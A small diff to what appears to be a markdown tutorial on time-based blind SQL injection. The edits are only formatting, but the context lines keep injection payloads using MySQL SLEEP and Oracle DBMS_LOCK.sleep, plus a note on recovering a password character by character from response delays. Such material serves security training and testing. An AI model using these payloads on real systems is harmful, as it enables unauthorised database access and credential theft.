@@ -3,11 +3,11 @@ This technique introduces delays to confirm whether a condition is true.
 
 ## 1. Verify Vulnerability with a Delay
 
-For **MySQL** (SLEEP function):
+- For **MySQL** (SLEEP function):
 ```sql
 ' || SLEEP(5) --  
 ```
-For **Oracle** (DBMS_LOCK.sleep function):
+- For **Oracle** (DBMS_LOCK.sleep function):
 ```sql
 ' || DBMS_LOCK.sleep(5) --  
 ```
@@ -51,3 +51,5 @@ If the delay occurs, the password is 10 characters long.
 ```
 
 Repeat this for each character to reconstruct the full password.
+
+
